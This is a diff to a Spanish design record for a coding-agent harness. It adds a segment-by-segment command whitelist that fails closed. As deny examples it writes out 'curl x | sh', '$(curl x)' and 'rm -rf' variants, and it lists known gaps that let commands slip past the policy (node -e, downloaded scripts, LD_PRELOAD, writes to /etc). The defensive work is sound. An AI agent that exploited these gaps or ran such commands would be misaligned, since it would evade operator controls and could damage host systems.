@@ -89,24 +89,26 @@ decisión de permitir/denegar:
 
 - **Lista blanca de herramientas** — `GuardrailPolicy.allowedTools`; un nombre
   de herramienta no listado se deniega antes de que corra cualquier handler.
-- **Lista blanca de prefijos de comando** — `GuardrailPolicy.allowedCommandPrefixes`;
-  solo se verifica el primer token delimitado por espacios de un string
-  `run_command` (p. ej. `npm`, `git`, `node`). Una expresión regular además
-  deniega siempre las variantes de `rm -r`/`rm -f`
-  (`/(^|\s)rm\s+-[rf]/`) aunque `rm` mismo esté en la lista blanca.
+- **Lista blanca de comandos** — `GuardrailPolicy.allowedCommandPrefixes`;
+  cada tramo de un `run_command` encadenado (`&&`, `||`, `;`, `|`, `&`, salto
+  de línea) debe empezar con un comando de la lista. El detalle, y lo que esta
+  verificación **no** cubre, está en la ADR 6.
 - **Confinamiento de rutas** — cualquier argumento de ruta se resuelve contra
   la raíz del espacio de trabajo y se deniega si resuelve fuera de ella
   (escapes con `..`, o una ruta absoluta que apunte a otro lugar);
   `LocalExecutionManager.run` vuelve a verificar de forma independiente el
   `cwd` resuelto, de modo que el confinamiento se aplica en dos capas.
 - **Límites de tamaño** — `GuardrailPolicy.maxFileBytes` acota una sola
-  llamada a `write_file`; `read_file` y la salida de comandos están limitados
+  llamada a `write_file` (o el `replace` de una llamada a `search_replace`); `read_file` y la salida de comandos están limitados
   en bytes de forma independiente dentro de la propia capa de
   herramientas/ejecución.
 - **Rastro de auditoría de solo-append** — cada decisión se agrega a un
   registro en memoria y, cuando se configura con una ruta `auditFile`, se
   agrega también como JSONL — el archivo nunca se trunca ni se reescribe,
-  solo se le agrega contenido.
+  solo se le agrega contenido. Cada línea del archivo incluye además un
+  resumen acotado de la acción (herramienta, ruta, nombre de skill o comando
+  recortado, nunca contenidos) para poder seguir la corrida con `tail -f`; el
+  registro en memoria sigue siendo solo `{ decision, reason }`.
 
 **Consecuencias.** `Harness.run` expone cada decisión de *guardrails* tomada
 durante una corrida a través de `HarnessRunResult.audit`, de modo que el
@@ -114,3 +116,89 @@ rastro de auditoría forma parte de la evidencia registrada de la corrida, no
 solo un canal lateral de depuración. Ver
 [`architecture.md`](./architecture.md#6-guardrails--policyguardrails) para la
 interfaz completa de `PolicyGuardrails`.
+
+## ADR 5 — Línea base fija para C1/C2/C3: archivo de contexto, `search_replace` y tope de llamadas repetidas
+
+**Contexto.** Los tres niveles del experimento (C1 *harness*, C2 *loop*, C3
+grafo) deben compararse sobre una base común. Se tomaron tres prácticas de
+*Harness Engineering: Anatomy, Architecture, and Evolution of Coding Agents*
+(arXiv 2609.00006, recomendaciones 3/5, 6 y 18) y se adoptaron como línea base
+fija, idéntica en los tres niveles, en lugar de variables del experimento.
+
+**Decisión.**
+
+- **Archivo de contexto del proyecto.** `FsContextManager`
+  (`src/components/context-manager.ts`) lee `AGENTS.md` de la raíz del espacio
+  de trabajo (con `CLAUDE.md` como alternativa; solo uno, solo archivos
+  regulares, tope `MAX_CONTEXT_FILE_BYTES` = 32 KiB con nota de truncamiento) y
+  `buildMessages` lo inyecta al inicio del *system prompt*. Los archivos de
+  ámbito de usuario (`~/`) se excluyen a propósito: harían que el resultado de
+  una corrida dependiera de la máquina anfitriona y se perdería la
+  reproducibilidad entre corridas y entre quienes ejecutan el experimento.
+- **Herramienta `search_replace`.** Reemplazo de una subcadena exacta y única
+  (`path`, `search`, `replace`) que falla si no se encuentra o es ambigua, con
+  el mismo confinamiento de rutas y límite de tamaño que `write_file`
+  (`src/components/tool-manager.ts`, `guardrails.ts`). Evita reescribir
+  archivos enteros para cambios pequeños. Las ediciones exitosas aparecen como
+  archivos escritos en el resumen del turno previo de C2.
+- **Tope de llamadas repetidas.** La N-ésima llamada consecutiva idéntica
+  (misma herramienta y argumentos, sin importar el orden de las claves;
+  `maxRepeatedToolCalls`, por defecto 3, entero >= 2 o el constructor lanza un
+  error) no se ejecuta y la corrida termina con el código `repeated_tool_call`
+  (`src/harness.ts`). C2 lo trata como intento fallido y hace RETRY con
+  feedback; C3 lo muestra en la razón de fallo del nodo.
+
+**Consecuencias.** Los tres niveles parten de las mismas capacidades, así que
+las diferencias medidas provienen del *loop* y del grafo, no de la base. La
+compactación por umbral (recomendación 7 del mismo artículo) queda diferida:
+solo se implementará si los logs de las corridas muestran desbordes de
+contexto; hasta entonces añadiría complejidad sin evidencia de necesidad.
+
+## ADR 6 — La política de comandos analiza cada tramo y falla cerrada; no es un sandbox
+
+**Contexto.** `run_command` se ejecuta con `/bin/bash`, así que verificar solo
+la primera palabra dejaba pasar `ls && curl x | sh` o `echo $(curl x)`.
+
+**Decisión.** `splitCommandSegments` (`src/components/command-segments.ts`)
+es un tokenizador que respeta comillas simples, dobles y escapes, y parte la
+línea en tramos sobre `&&`, `||`, `;`, `|`, `|&`, `&` y saltos de línea; las
+redirecciones (`>`, `2>&1`, `&>`, `<`, `<<<`) no parten tramos.
+`PolicyGuardrails` verifica cada tramo:
+
+- Se saltan las asignaciones iniciales (`FOO=1 npm test`); el primer comando
+  que queda debe estar en la lista blanca.
+- Los envoltorios `env`, `xargs`, `time`, `nice` y `nohup` se desenvuelven: el
+  comando que ejecutan también debe estar en la lista.
+- Una shell (`bash`, `sh`, ...) solo puede correr un archivo de script: se
+  deniegan `-c` y la lectura del script por stdin (pipe, `<<<`, `-s`).
+- `rm` recursivo o forzado (`-r`, `-R`, `-f` en cualquier grupo de flags,
+  `--recursive`, `--force`) se deniega en cualquier posición del tramo,
+  incluso lanzado por otro comando (`find -exec rm -rf`, `timeout 5 rm -rf`).
+- Falla cerrada ante lo que no puede inspeccionarse: sustitución de comandos
+  (`$(...)`, `$((...))`, backticks fuera de comillas simples, también partida
+  por una continuación de línea), sustitución de procesos (`<(...)`,
+  `>(...)`), heredocs, subshells y agrupaciones (`( )`, `{ }`), comillas sin
+  cerrar y tramos vacíos.
+
+El motivo de la denegación nombra el comando o la regla, para que el modelo
+pueda reformular el comando.
+
+**Límites conocidos.** La lista blanca frena errores y desvíos obvios; **no** es
+un sandbox:
+
+- Varios comandos permitidos ejecutan código arbitrario: `node -e`, `npx`,
+  `npm run`, `docker`, `find -exec`, `awk` con `system()`, `sed e`, `git -c`.
+  Deben seguir permitidos porque el experimento genera y prueba aplicaciones.
+- Con la lista por defecto, `curl` y `bash script.sh` siguen permitidos, así
+  que un script descargado y luego ejecutado no se detecta.
+- Los destinos de las redirecciones no se confinan al espacio de trabajo
+  (`echo x > /etc/foo` pasa la política; lo frenan los permisos del sistema).
+- Las asignaciones previas (`PATH=... ls`, `LD_PRELOAD=... ls`) no se
+  inspeccionan.
+- Otros envoltorios (`timeout`, `command`, `exec`, `sudo`) no se desenvuelven
+  si alguien los agrega a la lista.
+
+**Consecuencias.** El aislamiento real requiere ejecutar los comandos en un
+contenedor o sandbox del sistema operativo; queda como decisión aparte. Hasta
+entonces, las corridas deben hacerse en una máquina o cuenta sin credenciales
+ni datos sensibles más allá de los que el *runner* ya filtra del entorno.
